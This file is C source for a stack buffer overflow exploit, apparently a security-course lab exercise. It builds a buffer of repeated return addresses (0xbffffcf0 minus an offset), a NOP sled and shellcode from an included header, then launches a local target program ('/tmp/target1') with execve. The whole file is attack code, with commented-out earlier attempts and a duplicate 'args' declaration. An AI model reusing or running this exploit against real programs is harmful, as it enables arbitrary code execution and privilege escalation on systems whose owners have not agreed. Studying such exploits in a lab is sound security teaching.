#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"
#define DEFAULT_OFFSET      100
#define DEFAULT_BUFFER_SIZE 300
#define NOP                 0x90


int main(void)
//void main(int argc, char *argv[]) 
{
	char *buff = NULL, *ptr;
//	char *args[] =  {TARGET, buff, NULL};
	long *addr_ptr, addr;
	int offset= DEFAULT_OFFSET, bsize= DEFAULT_BUFFER_SIZE;
	int i;
	/*char arg1[] = "Hi there!AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
	char *args[] = { TARGET, arg1, NULL };
	char *env[] = { NULL };
	if (argc > 1) bsize = atoi(argv[1]);
	if (argc > 2) offset = atoi (argv[2]);
	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");*/
	if (!(buff = malloc(bsize))) {
		printf ("Can't allocate memory.\n");
		exit(0);
		}
	addr = 0xbffffcf0 - offset;
//	printf ("00");
	printf ("Using address: 0x%x\n", addr);
	//printf ("01");
	ptr = buff;
	//printf ("02");
	addr_ptr = (long *) ptr;
	for (i=0; i < bsize; i+=4)
		*(addr_ptr++) = addr;
	printf("1");
	for (i=0; i < bsize/2; i++)
		buff[i] = NOP;
	printf("2");
	ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
	for (i=0; i < strlen (shellcode); i++)
		*(ptr++) = shellcode[i];

	buff[bsize -1] = '\0';
	printf("buff = %s", buff);

	//memcpy(buff, "EGG=",4);
	//putenv(buff);
	//system("/bin/bash");
	char* args[] = {TARGET, buff, NULL};
	if (0 > execve(TARGET, args, NULL))
		fprintf(stderr,"execve failed.\n");
	
//	return 0;
}
